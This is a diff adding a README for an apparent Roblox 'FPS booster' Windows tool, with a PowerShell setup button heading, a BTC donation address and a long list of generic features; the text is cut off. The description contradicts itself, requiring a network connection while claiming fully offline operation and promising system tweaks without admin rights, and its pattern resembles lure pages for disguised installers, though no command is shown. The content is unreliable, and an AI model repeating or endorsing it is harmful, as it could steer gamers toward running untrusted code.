@@ -1,0 +1,90 @@
+Robrun FPS Booster Optimizer Lag Fix Tool — Windows Desktop Client
+
+⚡ PowerShell Setup Button
+
+Help keep this going
+
+BTC:&nbsp;14DidSTtiXhRMwDghJLGcxSutnZS29zbsE
+
+Robrun FPS Booster Optimizer Lag Fix Tool is a desktop utility engineered to reduce frame-time variance and stabilize rendering performance in Roblox on Windows-based systems. It applies targeted process-priority adjustments, background-service throttling, and configurable graphics and memory-tuning profiles to minimize stutter and input latency during gameplay. The application exposes granular controls for per-profile resource allocation, real-time performance telemetry, and reversible system tweaks, allowing users to balance visual fidelity against frame rate on their specific hardware. All optimizations are applied through a lightweight native interface with persistent configuration profiles and one-click restoration of default system settings.
+
+🔧 Requirements
+
+- Windows 10 or Windows 11
+- PowerShell 5.1 or newer (already available on Windows)
+- Active network connection
+- No admin rights needed
+
+Features
+
+- Adaptive Frame Pacing Engine — Dynamically rebalances CPU and GPU frame submission to reduce stutter and micro-lag during sustained gameplay sessions.
+- Process Priority Scheduler — Reassigns thread priority for the active game process, minimizing contention with background system services.
+- Memory Reclamation Module — Periodically trims standby and cached memory pages to lower paging pressure and reduce frame-time variance.
+- GPU Pipeline Tuner — Adjusts rendering queue depth and shader compilation behavior to smooth frame delivery on supported hardware.
+- Network Latency Stabilizer — Applies socket-level QoS and buffer tuning to reduce packet jitter and input-to-server round-trip variance.
+- Background Service Throttler — Detects and deprioritizes non-essential background processes that compete for CPU cycles and disk I/O.
+- Real-Time Telemetry Overlay — Displays frame time, FPS, CPU/GPU utilization, and memory usage with configurable sampling intervals.
+- Per-Application Profiles — Stores independent optimization configurations per executable so settings are applied automatically on launch.
+- Safe Rollback System — Captures a system state snapshot before each optimization pass, enabling one-click restoration of prior configurations.
+- Low-Overhead Architecture — Operates with a minimal resident footprint and no persistent kernel drivers, avoiding conflicts with anti-gameplay utility systems.
+- Headless CLI Mode — Supports scripted and automated optimization runs for advanced users and benchmarking workflows.
+- Offline Operation — Functions entirely without network access; no telemetry or configuration data leaves the local machine.
+
+How it works
+
+Robrun FPS Booster Optimizer Lag Fix Tool operates through a layered performance pipeline that identifies resource contention, reduces rendering overhead, and stabilizes frame delivery without modifying game assets or requiring manual configuration.
+
+At startup, the tool performs a system profiling pass that inventories active processes, GPU and CPU utilization patterns, memory pressure, and background service activity. This baseline snapshot is used to classify workloads and determine which optimizations can be applied safely on the current hardware configuration.
+
+The optimization engine then applies targeted adjustments across four functional layers:
+
+- Process and priority management — Non-essential background processes are deprioritized, and the target application receives elevated scheduling priority so CPU time is allocated to frame-critical threads.
+- Memory and cache tuning — Working-set trimming and cache reallocation reduce paging stalls and shorten frame-time spikes caused by memory contention.
+- GPU pipeline optimization — Rendering-related settings are aligned with detected hardware capabilities to reduce redundant draw overhead and shader compilation hitches.
+- Frame pacing stabilization — Frame delivery is smoothed by monitoring frame intervals in real time and adjusting scheduling behavior when variance exceeds configured thresholds.
+
+Each adjustment is applied incrementally and validated against live telemetry. If a change degrades performance or triggers instability, it is automatically reverted, ensuring the system remains in a known-good state. All modifications are session-scoped by default, with persistent profiles available for repeat configurations.
+
+The tool continuously collects performance metrics during operation, including average FPS, frame-time percentiles, and system latency indicators. These metrics drive adaptive tuning, allowing the optimizer to respond to workload changes such as scene transitions, background task surges, or thermal throttling.
+
+A lightweight diagnostic layer logs all applied changes, rollback events, and telemetry anomalies, providing a traceable record of every optimization action for troubleshooting and performance review.
+
+Modules and Settings
+
+Optimization Profiles
+Profiles bundle related system and game tweaks so users can apply a coherent set of adjustments instead of editing configuration files by hand.
+- Profile selector with a balanced option for everyday play and a more aggressive option for lower-end hardware.
+- Pre-apply review list where each included change can be reviewed, deselected, or left out before anything is committed.
+- Post-apply summary displaying exactly which items were changed, so the outcome stays visible.
+- Profile customization so users can build a saved variant from selected items and reuse it later.
+
+Background Process and Startup Control
+This module manages the processes and startup entries that compete for CPU, memory, and disk time while a game session is active.
+- Process list showing running background items with the option to suspend or close selected entries before launch.
+- Startup entry review so users can decide which automatic items to hold back during play.
+- Restore action that returns suspended or closed items to their prior state after the session ends.
+- Session-based toggle so selected entries are only affected while a game is running rather than permanently disabled.
+
+Graphics and Game Presets
+A single panel collects Roblox-related display and rendering options so users can tune visual quality and frame behavior without navigating in-game menus repeatedly.
+- Sliders and toggles for graphics quality level, frame rate caps, and windowed or fullscreen preference, each reflecting the current value.
+- Preset saving and switching so different configurations can be reused across sessions.
+- Live value display confirming what each control currently sets before a preset is applied.
+
+Network and Latency Tuning
+This module exposes local network-related settings that can influence connection consistency, presented with plain-language explanations.
+- DNS selection and adapter-level options with a description of what each item affects.
+- Before-and-after value reporting so users can see exactly what was modified.
+- Per-item revert so individual network changes can be undone without affecting other applied settings.
+
+Cleanup and Monitoring
+These two related views handle reclaimable storage and in-session visibility of how applied settings are performing.
+- Cleanup categories for temporary files and caches, with estimated space shown per category before running.
+- Category selection so users choose what to include, followed by a log of removed items for traceability.
+- Monitoring panel displaying current CPU and memory usage alongside configured frame rate targets during play.
+- Counter toggles and refresh interval adjustment to control which readouts appear and how often they update.
+
+Per-Game Rules and Snapshots
+Rules tie profiles and cleanup routines to specific game executables, while snapshots provide the safety net underneath every change.
+
+…（内容已截断）
